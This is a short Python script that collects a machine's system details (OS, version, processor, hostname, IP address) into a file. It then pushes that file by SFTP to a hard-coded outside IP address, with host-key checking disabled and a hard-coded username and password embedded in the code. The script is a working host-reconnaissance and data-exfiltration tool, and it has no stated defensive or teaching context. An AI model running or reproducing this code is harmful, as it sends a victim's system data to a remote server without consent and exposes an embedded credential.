#Importing Modules
import socket
import random
import time
import datetime
import paramiko
import pysftp as sftp

#Grabs and stores data
import platform
machine = platform.machine()
ver = platform.version()
plat = platform.platform()
uname = platform.uname()
sys = platform.system()
proc = platform.processor()
hostn = socket.gethostname()
IP = socket.gethostbyname(hostn)
date = datetime.datetime.today().strftime('%Y-%m-%d')
remotePath = ""
password = ""
print (machine)
print (ver)
print (plat)
print (uname)
print (sys)
print (proc)
print (date)

text_file = open(hostn+date+".txt", "w",)
local_path = hostn+date+'.txt'
text_file.write("info: \n"+machine+"\n"+ver+"\n"+plat+"\n"+sys+"\n"+proc+"\n"+date+"\n"+IP)

text_file.close()

def push_file_to_server():
    cnopts = sftp.CnOpts()
    cnopts.hostkeys = None
    s = sftp.Connection(host='54.201.26.36', username='sftpuser', password='Z&@9u$^NhTX%CCdtbDM7zXyBKRn=^z9dVy=*sqZ&k?dZ5cL%JkLMC#q6vFYTL&UE+*b^&Pn5DYj#ZKfjG5sA!xcMrPu5+jq$wX&pJ*m^28fY-5Fb4a2AhcEx9JtRVJVc', cnopts=cnopts)
    remote_path = '/sftpuser/'+local_path
    s.put(local_path, remote_path)
    s.close()

push_file_to_server()